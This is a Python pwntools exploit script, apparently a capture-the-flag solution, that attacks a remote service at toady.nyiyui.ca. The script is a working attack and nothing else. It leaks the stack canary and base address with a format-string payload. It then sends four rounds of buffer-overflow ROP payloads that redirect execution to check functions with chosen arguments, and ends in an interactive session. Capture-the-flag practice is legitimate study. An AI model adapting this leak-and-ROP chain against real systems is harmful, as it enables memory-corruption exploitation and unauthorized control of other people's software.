from pwn import *

io = remote('toady.nyiyui.ca', 2000)

# Gadgets:
padding = b'a'*32
check1 = 0x000012ad
check2 = 0x000012ca
check3 = 0x000012e7
finalcheck = 0x00001304
main = 0x00001419

# 1st round
# Leaking
leak_payload = b'%15$x %19$x'
io.recvuntil(b'Good luck.\n')
io.sendline(leak_payload)
leak = io.recvline(keepends=False).decode().split(' ')
canary = int(leak[0], 16)
base = int(leak[1], 16) - 0x0000146a
print(f'Leaked canary: {hex(canary)}')
print(f'Leaked base address: {hex(base)}')

# ROPing
payload = padding + p32(canary) + b'a'*12
payload += p32(base+check1) + p32(base+main) + p32(0x1337) 
io.sendline(payload)

# 2nd round
# Leaking (not needed)
io.recvuntil(b'Good luck.\n')
io.sendline(b'segs')

# ROPing
payload = padding + p32(canary) + b'a'*12
payload += p32(base+check2) + p32(base+main) + p32(0x420) 
io.sendline(payload)

# 3rd round
# Leaking (not needed)
io.recvuntil(b'Good luck.\n')
io.sendline(b'segs')

# ROPing
payload = padding + p32(canary) + b'a'*12
payload += p32(base+check3) + p32(base+main) + p32(0xDEADBEEF) 
io.sendline(payload)

# Final round
# Leaking (not needed)
io.recvuntil(b'Good luck.\n')
io.sendline(b'segs')

# ROPing
payload = padding + p32(canary) + b'a'*12
payload += p32(base+finalcheck) + p32(base+main) + p32(0x123)
io.sendline(payload)

io.interactive()